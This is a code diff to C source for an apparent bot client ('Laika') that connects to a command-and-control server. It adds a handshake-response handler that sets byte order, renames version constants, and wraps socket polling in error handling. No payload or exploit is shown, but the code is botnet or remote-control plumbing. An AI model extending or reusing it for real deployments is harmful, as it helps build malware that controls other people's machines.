@@ -7,7 +7,15 @@ size_t laikaB_pktSizeTbl[LAIKAPKT_MAXNONE] = {
 };
 
 void laikaB_pktHandler(struct sLaika_peer *peer, uint8_t id, void *uData) {
-    printf("got %d packet id!\n", id);
+    switch (id) {
+        case LAIKAPKT_HANDSHAKE_RES: {
+            uint8_t endianness = laikaS_readByte(&peer->sock);
+            peer->sock.flipEndian = endianness != laikaS_isBigEndian();
+            break;
+        }
+        default:
+            LAIKA_ERROR("unknown packet id [%d]\n", id);
+    }
 }
 
 struct sLaika_bot *laikaB_newBot(void) {
@@ -42,8 +50,8 @@ void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
     /* queue handshake request */
     laikaS_writeByte(sock, LAIKAPKT_HANDSHAKE_REQ);
     laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
-    laikaS_writeByte(sock, LIB_VERSION_MAJOR);
-    laikaS_writeByte(sock, LIB_VERSION_MINOR);
+    laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
+    laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
 
     if (!laikaS_handlePeerOut(bot->peer))
         LAIKA_ERROR("failed to send handshake request!\n")
@@ -58,16 +66,19 @@ bool laikaB_poll(struct sLaika_bot *bot, int timeout) {
     if (numEvents == 0) /* no events? timeout was reached */
         return false;
 
+LAIKA_TRY
     if (evnt->pollIn && !laikaS_handlePeerIn(bot->peer))
         goto _BKill;
 
     if (evnt->pollOut && !laikaS_handlePeerOut(bot->peer))
         goto _BKill;
 
-    if (!evnt->pollIn && !evnt->pollOut) {
+    if (!evnt->pollIn && !evnt->pollOut)
+        goto _BKill;
+LAIKA_CATCH
 _BKill:
-        laikaS_kill(&bot->peer->sock);
-    }
+    laikaS_kill(&bot->peer->sock);
+LAIKA_TRYEND
 
     return true;
 }
